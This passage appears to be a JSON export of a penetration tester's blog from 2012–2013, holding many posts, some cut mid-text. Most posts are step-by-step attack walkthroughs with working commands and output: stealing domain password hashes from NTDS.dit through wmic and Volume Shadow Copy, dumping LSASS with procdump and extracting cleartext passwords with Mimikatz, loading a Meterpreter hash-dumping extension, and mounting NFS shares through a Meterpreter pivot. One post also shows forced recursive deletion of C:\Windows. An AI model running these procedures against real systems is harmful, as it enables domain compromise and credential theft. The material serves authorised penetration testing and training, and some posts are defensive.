[\"DWORD\",\"ProcessInformationClass\",\"in\"], [\"PDWORD\",\"ProcessInformation\",\"inout\"], [\"DWORD\",\"ProcessInformationLength\",\"in\"], ]) processinfo = 0x8000F129 cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return'] client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,processinfo,0x4) Which results in a process that you can’t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies. I’m curious if with some tweaking I can get it to act much like the KillMe.exe https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe Which continues to operate just fine after the modification happens. ","date":"2013-08-10","objectID":"https://malicious.link/posts/2013/2013-08-10-unkillable-processes/:0:0","tags":["railgun","x64","incomplete","ccdc"],"title":"Unkillable Processes","uri":"https://malicious.link/posts/2013/2013-08-10-unkillable-processes/"},{"categories":["rant",""],"content":"Problems are that everyone does this whole blogging thing in so many different ways. Me, personally? I like to have a client that I can save drafts it, work on things a little bit here and there and then finalize stuff when I’m ready to post. I have a couple dozen of these posts ready and set with final tweaks needed but my blogging software Squarespace up and moved on to “Squarespace 6”. The the current stage you don’t have to move to 6 but at some point the owners of Squarespace are going to force everyone over. I don’t want to wait for that to happen. Octopress and Postach.io are my favorite options right now. Both blog in markdown language which is ok. Converting 8 years of blog posts to markdown is going to be a lot of work but a one time deal. Plus it would give me a chance to go through and fix the things that were broken over the years of modified blogging clients and services. Postach.io has one major downside, they don’t have good “code” block support, whereas Octopress/Jekyll have excellent support as well code hilighting. The major upside? It’s based on Evernote. Which means I can blog from whereever I have Evernote. They also used to have an EXCELLENT feature that seems to have disappeared where if you updated a post it would automatically throw the blog post up to the top of your page, meaning your update would get back in your RSS feed and the update wouldn’t go unnoticed as most updates to blog posts do. ","date":"2013-08-10","objectID":"https://malicious.link/posts/2013/2013-08-10-problems-with-blogging-software/:0:0","tags":[],"title":"Problems with blogging software","uri":"https://malicious.link/posts/2013/2013-08-10-problems-with-blogging-software/"},{"categories":["shadowcopy","cracking"],"content":"Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools: From: http://www.ntdsxtract.com/ Download: http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip From: http://code.google.com/p/libesedb/ Download: https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz Extract the tools: tar zxvf libesedb-alpha-20120102.tar.gz unzip ntdsxtract_v1_0.zip Compile/make libesedb: root@wpad:~/blog/# cd libesedb-20120102 root@wpad:~/blog/libesedb-20120102# ./configure root@wpad:~/blog/libesedb-20120102# make Export the tables from NTDS.dit: root@wpad:~/blog/libesedb-20120102# cd esedbtools/ root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport esedbexport 20120102 Missing source file. Use esedbexport to export items stored in an Extensible Storage Engine (ESE) Database (EDB) file Usage: esedbexport [ -c codepage ] [ -l logfile ] [ -m mode ] [ -t target ] [ -T table_name ] [ -hvV ] source source: the source file -c: codepage of ASCII strings, options: ascii, windows-874, windows-932, windows-936, windows-1250, windows-1251, windows-1252 (default), windows-1253, windows-1254 windows-1255, windows-1256, windows-1257 or windows-1258 -h: shows this help -l: logs information about the exported items -m: export mode, option: all, tables (default) 'all' exports all the tables or a single specified table with indexes, 'tables' exports all the tables or a single specified table -t: specify the basename of the target directory to export to (default is the source filename) esedbexport will add the suffix .export to the basename -T: exports only a specific table -v: verbose output to stderr -V: print version root@wpad:~/blog/libesedb-20120102/esedbtools# root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit esedbexport 20120102 Opening file. Exporting table 1 (MSysObjects) out of 12. Exporting table 2 (MSysObjectsShadow) out of 12. Exporting table 3 (MSysUnicodeFixupVer2) out of 12. Exporting table 4 (datatable) out of 12. Exporting table 5 (hiddentable) out of 12. Exporting table 6 (link_table) out of 12. Exporting table 7 (sdpropcounttable) out of 12. Exporting table 8 (sdproptable) out of 12. Exporting table 9 (sd_table) out of 12. Exporting table 10 (MSysDefrag2) out of 12. Exporting table 11 (quota_table) out of 12. Exporting table 12 (quota_rebuild_progress_table) out of 12. Export completed. Move the exported tables to somewhere a bit easier: root@wpad:~/blog/libesedb-20120102/esedbtools# root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../ NTDS extract can do a lot more than just hashes: root@wpad:~/blog# cd NTDSXtract 1.0/ root@wpad:~/blog/NTDSXtract 1.0# ls dscomputers.py dsdeletedobjects.py dsfileinformation.py dsgroups.py dstimeline.py dsusers.py framework ntds root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py DSUsers Extracts information related to user objects usage: dsusers.py [option] options: --rid List user identified by RID --name List user identified by Name --passwordhashes Extract password hashes --passwordhistory Extract password history --certificates Extract certificates --supplcreds Extract kerberos keys --membership List groups of which the user is a member root@wpad:~/blog/NTDSXtract 1.0# But we like hashes: root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive Running with options: Extracting password hashes Extracting password history Initialising engine... Scanning database - 100% -\u003e 3475 records processed Extracting schema information - 100% -\u003e 1549 records processed Extracting object links... List of users: ============== Record ID: 3562 User name: Administrator User principal name: SAM Account name: Administrato","date":"2013-06-11","objectID":"https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/:0:0","tags":null,"title":"Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2","uri":"https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/"},{"categories":["shadowcopy","cracking"],"content":" This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC. Ever run into a Domain Controller that wasn’t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start First authenticate to the domain controller and make sure you have a good working directory to use. net use \\\\DC1 /user:DOMAIN\\domainadminsvc domainadminsvc123 dir \\\\DC1\\C$ Alright, lets say “TEMP” is there and it’s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in C:\\TEMP where we already made sure is clear. We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory’s DB much like Window’s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials. So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you’ve installed wmic for Linux via http://www.krenger.ch/blog/wmi-commands-from-linux/ ) - this IS an interactive command so this won’t work very nicely in a Meterpreter shell: C:\\temp\u003ewmic /node:DC1 /user:DOMAIN\\domainadminsvc /password:domainadminsvc123 process call create \"cmd /c vssadmin list shadows 2\u003e\u00261 \u003e C:\\tempoutput.txt\" Executing (Win32_Process)-\u003eCreate() Method execution successful. Out Parameters: instance of __PARAMETERS { ProcessId = 7304; ReturnValue = 0; }; To break down this command: wmic /node:DC1 - tells it to interact with the WMI API on DC1 /user:DOMAIN\\domainadminsvc /password:domainadminsvc123 - authentication process call create - WMI speak for create a process cmd /c - vssadmin doesn’t operate outside of cmd for some reason… vssadmin list shadows - List any shadow volumes that already exist 2\u003e\u00261 \u003e C:\\temp\\output.txt - Take STDIN and STDERROR and throw it in a text file on DC1 C:\\TEMP. Make sure you specify full path because you will be executing from within C:\\Windows\\System32 and its a pain to find anything in that directory. So if you just specify \u003e bob.txt you get to hunt in C:\\Windows\\System32 or wherever WMI wants to execute you from for bob.txt Process starts and then you need to view the output file by either copying it down, type \\DC1\\C$\\TEMP\\output.txt or mount the C drive as a network share. Either way you should either see something like this: C:\\temp\u003etype output.txt vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2005 Microsoft Corp. Contents of shadow copy set ID: {671090fd-0198} Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM Shadow Copy ID: {0863e309} Original Volume: (C:)\\\\?\\Volume{c44da10e-0154-11e1-b968-806e6f6e6963}\\ Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 Originating Machine: wpad Service Machine: wpad Provider: 'Microsoft Software Shadow Copy provider 1.0' Type: ClientAccessibleWriters Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered or C:\\temp\u003etype output.txt vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2005 Microsoft Corp. No items found that satisfy the query If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the ‘vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don’t have to remember this): C:\\temp\u003ewmic /node:DC1 /user:DOMAIN\\domainadminsvc /password:domainadmin","date":"2013-06-10","objectID":"https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/:0:0","tags":null,"title":"Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1","uri":"https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/"},{"categories":["mimikatz","meterpreter","metasploit"],"content":"Mimikatz is now built into Metasploit’s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don’t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz’s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool. Mimikatz Minidump: http://blog.gentilkiwi.com/securite/mimikatz/minidump Procdump: http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can) net use \\\\TARGETBOXC$ /user:DOMAIN\\serviceaccount serviceaccount123 dir \\\\TARGETBOX\\C$ If that works then we want to check that we can all the “AT” command on the remote host: at \\\\TARGETBOX All set. Next lets prep our workspace on the remote host. We are using the C:\\Temp directory. mkdir \\\\TARGETBOX\\C$\\Temp dir \\\\TARGETBOX\\C$\\Temp copy c:\\temp\\procdump.exe \\\\TARGETBOXC$ copy c:\\temp\\procdump.bat \\\\TARGETBOXC$ The contents of procdump.bat are: @echo off C:\\temp\\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp I’m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I’ve dumped more than one IP that is actually the same host. Next we schedule the task. Use net time to determine the local time for the remote machine. net time \\\\TARGETBOX at \\\\TARGETBOX 13:52 C:\\Temp\\procdump.bat Pull down the file and clean up: dir \\\\TARGETBOX\\C$\\Temp copy \\\\TARGETBOX\\C$\\Temp\\*lsass.dmp C:\\temp\\output\\ rmdir /s \\\\TARGETBOX\\C$\\Temp On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png Load up the Alpha version of Mimikatz, switch it to minidump mode and you’re dumping creds: mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp Switch to MINIDUMP mimikatz # sekurlsa::logonPasswords full Thats it. Password dumping without ever using a “Hacker” tool on target. Much love Microsoft. And even more to Mimikatz creator @gentilkiwi - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter. ","date":"2013-06-07","objectID":"https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/:0:0","tags":null,"title":"Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool","uri":"https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"},{"categories":["cli","privesc","services"],"content":"This is how I did it: for /f \"tokens=5 delims=\" %A in ('reg query HKLM\\SYSTEM\\CurrentControlSet\\Services') do sc qc %A Let me know if you know of a better way. If you don’t know why this could be important read here: http://www.ihtb.org/security/program.exe-privilege_escalation.txt If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: wmic service get pathname ","date":"2013-05-30","objectID":"https://malicious.link/posts/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/:0:0","tags":null,"title":"Query all windows services config from the command line","uri":"https://malicious.link/posts/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/"},{"categories":["metasploit","meterpreter","mimikatz"],"content":"Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing. Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it: No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet: http://www.hsc.fr/ressources/outils/sessiondump/ Before we get started lets be clear about one thing. Sessiondump while awesome doesn’t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),. Without further ado lets go ahead and get the file and do a bunch of extracting. And finally placing everything in it’s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure: Cool, everything should be good to go. Lets use this thing. I’m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\\AUTHORITY SYSTEM. After that it’s cake, load the extension: Here is the available commands: And run getHashes: or getwDigestPasswords: Thats is, you free passwords, YAY… Possible issues you may run into: If you are on a x64 box and meterpreter isn’t running in a x64 process it will fail saying that it doesn’t have the correct version offsets, here is how you can check: x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn’t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails. If by any chance you are running it against a system the author hasn’t gotten the offsets for. I don’t’ have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I’ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump. Thats all for now folks, may the shells be with you. ","date":"2013-04-08","objectID":"https://malicious.link/posts/2013/2013-04-08-sessiondump-meterpreter-extension/:0:0","tags":null,"title":"Sessiondump Meterpreter Extension","uri":"https://malicious.link/posts/2013/2013-04-08-sessiondump-meterpreter-extension/"},{"categories":["training","cons","metasploit"],"content":"Just a quick post to say that egypt and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us Linky: http://www.blackhat.com/us-13/training/metasploit-mastery.html Current fill rate of July 27-28 session: Current fill rate of July 29-30 session: EOM ","date":"2013-03-19","objectID":"https://malicious.link/posts/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/:0:0","tags":null,"title":"Metasploit Mastery @BlackHatEvents USA 2013","uri":"https://malicious.link/posts/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/"},{"categories":["cracking","cli"],"content":"This is one of those stupid simple things that are easy to forget so I’m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don’t have to, but there is times where it’s important. Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it’s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have “iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii” on the 3rd line of your dictionary, testing every possible permutation where you replace an ‘i’ with a 1 is going to take a very long time. Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I’m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don’t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them. To do that is very simple: awk '{print length, $0}' rockyou.txt | sort -n | cut -d \" \" -f2- \u003e rockyou_ls.txt Thats it. Basic, simple and stored here for reference. ","date":"2013-03-18","objectID":"https://malicious.link/posts/2013/2013-03-18-length-sorting-wordlists/:0:0","tags":null,"title":"Length Sorting Wordlists","uri":"https://malicious.link/posts/2013/2013-03-18-length-sorting-wordlists/"},{"categories":["tools","nfs"],"content":"You’ve found an NFS share on a pentest, it’s sharing out your target’s home directories (/home) and some SAN with all of the Windows AD users “home” directories under /volumes/users/. You only have a meterpreter session though… enough back story, problem is that Metasploit doesn’t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I’m wrong, but there also aren’t any tools for talking to NFS shares over TCP only proxies. Enter NfSpy: https://github.com/bonsaiviking/NfSpy While it’s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible. First we setup up our route so that the aux module will go over the meterpreter session: route add 192.168.1.0 255.255.255.0 1 The 1 on the end being the meterpreter session number it’s going to be going through. Next up is to find out what exports are available: msf \u003e use auxiliary/scanner/nfs/nfsmount msf auxiliary(nfsmount) \u003e show options Module options (auxiliary/scanner/nfs/nfsmount): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 111 yes The target port THREADS 1 yes The number of concurrent threads\u003c msf auxiliary(nfsmount) \u003e set RHOSTS 192.168.1.50 RHOSTS =\u003e 192.168.1.50 msf auxiliary(nfsmount) \u003e run [+] 192.168.1.50 NFS Export: /home [192.168.1.0/24] [+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24] Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too: msf \u003e use auxiliary/scanner/misc/sunrpc_portmapper msf auxiliary(sunrpc_portmapper) \u003e show options Module options (auxiliary/scanner/misc/sunrpc_portmapper): Name Current Setting Required Description\u003c ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 111 yes The target port THREADS 1 yes The number of concurrent threads msf auxiliary(sunrpc_portmapper) \u003e set RHOSTS 192.168.1.50 RHOSTS =\u003e 192.168.1.50 msf auxiliary(sunrpc_portmapper) \u003e run [+] 192.168.1.50 - Programs available rpcbind - 111/tcp rpcbind - 111/udp status - 46797/udp status - 55731/tcp nfs - 2049/tcp nfs_acl - 2049/tcp nfs - 2049/udp nfs_acl - 2049/udp nlockmgr - 54167/udp nlockmgr - 38216/tcp mountd - 52569/udp\u003c mountd - 37719/tcp mountd - 39099/udp mountd - 55763/tcp mountd - 37808/udp mountd - 54457/tcp [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit’s socks proxy: msf \u003e use auxiliary/server/socks4a msf auxiliary(socks4a) \u003e show options Module options (auxiliary/server/socks4a): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on. msf auxiliary(socks4a) \u003e set SRVPORT 9050 SRVPORT =\u003e 9050 msf auxiliary(socks4a) \u003e set SRVHOST 127.0.0.1 SRVHOST =\u003e 127.0.0.1 msf auxiliary(socks4a) \u003e run [*] Auxiliary module execution completed [*] Starting the socks4a proxy server I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don’t mind having the Anons of the world surf through your meterpreter session into your clients. Next up it actually using nfspy (create or prep a directory so you can mount it first): proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount ProxyChains-3.1 (http://proxychains.sf.net) FUSE library version: 2.8.6 nullpath_ok: 0 unique: 1, opcode: INIT (26), nodeid: 0, insize: 56 INIT: 7.16 flags=0x0000007b max_readahead=0x0002","date":"2013-03-04","objectID":"https://malicious.link/posts/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/:0:0","tags":null,"title":"Mounting NFS shares through Meterpreter with NfSpy","uri":"https://malicious.link/posts/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/"},{"categories":["internet"],"content":"It seems like every week there is a new compromise of some service or another. But as a user what are you supposed to do with this knowledge? Here are some suggestions on things to do or think about when reacting: Do you use the password you use there anywhere else? Think about starting to use a password manager like LastPass, 1Password, KeePass, or a product like Yubico. This way you can very easily use different passwords for different sites. Sit down and and start changing every where you use that password. Not just web sites, any machines (your work account) or applications are also possible targets. Start with the sites, machines, and applications that are most sensitive to you. It’s ok to have a hand written list of passwords for sites. One of my favorite suggestions is to take your drivers license or business card and generate passwords by using every X character on the license and base the X number on the how many letters are in the website. So you use every 6th character for Google. It is NOT ok to store your passwords for anything in a Excel, Word or Text document. These are easy pickings for hackers and almost always targeted. Again, think about using a password manager Do NOT change your password on the affected site or service immediately. You may never know the extent of the compromise but if the company says anything to the effect of “still under investigation” or “preliminary results”, there is a chance that the attacker has also compromised the password reset mechanism so changing your password would just give the attacker the new one you have elected. Do NOT stop using the service, if they have made it public that they were compromised, especially if they come out with the information first, the company is one of the few that take their dedication to their users seriously. If anything it’s a positive (that they came out and said something, not that they were compromised). Very few companies are open about such things as it happens much more often than people want to admit to. Got other suggestions for people on how to handle such news? Leave a comment and I’ll include it in the main post with attribution. ","date":"2013-03-02","objectID":"https://malicious.link/posts/2013/2013-03-02-suggestions-on-what-to-do-when-a-service-you-use-gets-compro/:0:0","tags":null,"title":"Suggestions on what to do when a service you use gets compromised","uri":"https://malicious.link/posts/2013/2013-03-02-suggestions-on-what-to-do-when-a-service-you-use-gets-compro/"},{"categories":["java","defense"],"content":"The following has been a concept for me for a long time and recently I tweeted the idea which really put me under the fire to prove it. (re: justanidea hashtag) And a few people came up with some very valid points: Doesn’t work so well with HTTPS sites He’s right, but that forces the attack to use SSL, and doing so can yield the defender more information about the attacker, and offer other avenues of defense. Can’t an attack just spoof the user-agent? and a response: But in actuality that setting is applied inside the Java code, which needs to be requested by Java first. Using it’s User-Agent string. There are probably ways to get this done with Java script or other methods of loading the Java classes/jars but I haven’t been able to find any. and finally 3) Whitelisting is a myth! Which goes along with phoobar’s responses as well: Yes, there will definitely be challenge when implementing blocking java user agents, and one of the biggest pit falls is that there is no clear indicators to a user that that’s the reason for the block. There are ways to make it more evident with custom proxy error pages, but it is a thorn in this solution. On to the walking of the walk. Oddly enough there is little to no documentation on blocking or even detecting outbound user-agent strings. But I did happen across an excellent post about how to use Squid to block IE (which I’m all for! ;-): http://gaugusch.at/squid.shtml The following is just my testing of his walk-through converted to be used to block java: I used pfSense for my testing since it’s very easy to set up and already has Squid as a package: You get the point. We set up the latest Java 0day in Metasploit: Get the user to go to our malicious web site: And the user doesn’t see anything. This can be modified in the module. You also see that I was using “Intranet” IP space so some IE settings were lower, but nothing that would effect this exploit. And shell! I want to pull your attention to that YWpdDan.jar request though. That request actually is done by Java with the following user-agent: \"Mozilla/4.0 (Windows XP 5.1) Java/1.7.0_09\" Alright, so the exploit works, but how about the solution? In pfSense you have the ability to slam “Custom Options” into the bottom of pfSense’s Squid config page. Like so: There is probably a better regex for selecting only Java user-agents, but this worked for now, and I don’t think any browsers actually use “Java” in their user-agents. (UPDATE: Searching for “site:useragentstring.com java” on google only yielded Java, and YACYBOT, which is built on java as using the string “Java” in their agents) You can also notice that I’ve whitelisted webex.com and java.com sites and subdomains so that my “users” won’t get blocked using the tools on those sites. This could be pretty hefty with (as phoobar said) a Java dev group. But after the initial push and getting a semi “required” list of external approved sites this list shouldn’t need much upgrading, even for large organizations. Save the config and let’s see how this works out: Ok, but did the attacker still get a shell? Nope! Win! Just to prove that HTTPS isn’t fixed here lets set those options up in Metasploit and kick the same exploit: And after an error about a self-signed cert (notice the SSLCert option in Metasploit that has the ability to solve that as well) we get the expected result: And subsequent shell without any indication in Squid’s proxy logs of a Java user-agent: That’s it, sort of a long post but hopefully something that people can use. Thanks! UPDATE: I’m not exactly certain how this affects Java “Web Start” weblet exploits if at all. ","date":"2013-02-27","objectID":"https://malicious.link/posts/2013/2013-02-27-blocking-java-exploits-malicious-signed-applets-and-0days/:0:0","tags":null,"title":"Blocking Java Exploits, Malicious Signed Applets, and 0days","uri":"https://malicious.link/posts/2013/2013-02-27-blocking-java-exploits-malicious-signed-applets-and-0days/"},{"categories":["tools"],"content":"This is here because I always forget how to do it sudo apt-get install libtirpc-dev libncurses-dev wget http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz tar zxvf nfsshell.tar.gz cd nfs ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h perl -p -i.orig -e 's/getline/getline_nfs/' nfs.c Next part I don’t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following “uncomment the following 4 lines for Solaris 2.x” and uncomment the 2 lines following “For GNU readline support you need to add” After that a simple “make” should get you ./nfs sitting there for your use. Will probably make a repo out of this so I don’t have to keep doing it.. ","date":"2013-02-22","objectID":"https://malicious.link/posts/2013/2013-02-22-compile-nfsshell-on-ubuntu/:0:0","tags":null,"title":"Compile NFSShell on Ubuntu","uri":"https://malicious.link/posts/2013/2013-02-22-compile-nfsshell-on-ubuntu/"},{"categories":["shmoocon","cons"],"content":"Thanks to @spatial_d for the tweet here: https://twitter.com/spatial_d/status/302253050725298176 I’m capturing it here more of a bookmark for myself: Build It: http://www.ustream.tv/channel/build-it-2013 Belay It: http://www.ustream.tv/channel/belay-it-2013 Bring It On: http://www.ustream.tv/channel/bring-it-2013 ","date":"2013-02-15","objectID":"https://malicious.link/posts/2013/2013-02-15-shmoocon-2013-streaming/:0:0","tags":null,"title":"ShmooCon 2013 Streaming","uri":"https://malicious.link/posts/2013/2013-02-15-shmoocon-2013-streaming/"},{"categories":["metasploit","training","cansecwest","cons"],"content":"In 2012 @egypt and I taught Metasploit Mastery for a day and a half @DerbyCon . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even) We are doubling down on the content being provided and doing a 3 full days @CanSecWest. You get to learn the nooks and cranies of Metasploit’s guts from the egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt’s beard is worth the price of admission. See you there! Link: http://cansecwest.com/dojos/2013/meta_mastery.html ","date":"2013-01-25","objectID":"https://malicious.link/posts/2013/2013-01-25-metasploit-mastery-meets-cansecwest/:0:0","tags":null,"title":"Metasploit Mastery meets CanSecWest","uri":"https://malicious.link/posts/2013/2013-01-25-metasploit-mastery-meets-cansecwest/"},{"categories":["cracking","whitechapel"],"content":"I made a slide deck to kind of explain my latest project. Basically I got fed up with having dictionaries, passwords, and cracking tools but no way to really do better collaboration in a team format as well as just better management for myself. Please feel free to submit pull requests, issues if you think something is broken or want features, or whatever on the Github repo here: https://github.com/mubix/WhiteChapel/ Here is the slide deck: Intro to White Chapel from Rob Fuller slideshare 16064224 ","date":"2013-01-19","objectID":"https://malicious.link/posts/2013/2013-01-19-intro-to-white-chapel/:0:0","tags":null,"title":"Intro to White Chapel","uri":"https://malicious.link/posts/2013/2013-01-19-intro-to-white-chapel/"},{"categories":["training","cyberpickpocket"],"content":"Drink!! So I’ve been working on a training package that takes a bit of a different approach than what I’ve normally done. The training breaks down like this: Day 1: Local LAN based exploit (Windows) Day 2: Remote Web based exploit (Linux) Day 3: Client side exploit (Windows) Day 4: Local exploit (FreeBSD) Day 5: Network of the Seven Bells Test Each day (save for the 5th) will focus on a single exploit, explaining it, running it on virtual machines, and spending 8 hours diving into as many detectable changes that exploit makes on a system.. and how to not make them or make them vanish. Day 5 will be a lot like a CTF where you know all the answers. First one to get all 7 exploits completed without being detected wins. Venue is TBD but I’ve been putting a lot of time into making the VMs and slides and stuff just needed to get some feedback on what you guys think. Let me know in the comments (something more valuable then, “great idea!” or , “thats stupid” please) ","date":"2013-01-06","objectID":"https://malicious.link/posts/2013/2013-01-06-cyber-pickpocketing/:0:0","tags":null,"title":"Cyber Pickpocketing","uri":"https://malicious.link/posts/2013/2013-01-06-cyber-pickpocketing/"},{"categories":["cli"],"content":"Not very security related, but something I don’t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done. Get a SYSTEM shell so all modding of permissions will be good. psexec /accepteula -i -s cmd Grant Administrators FULL rights to the directory and all sub directories and files icacls C:\\Windows\\* /grant Administrators:F /C /T Finish the job, delete the folder and everything below it rmdir /s /q C:\\Windows\\ All done. Weeeeeeeee! If you have a better way to do this via commands or programs please let me know, always looking to learn more. ","date":"2012-12-24","objectID":"https://malicious.link/posts/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/:0:0","tags":null,"title":"Delete TrustedInstaller-only Files and 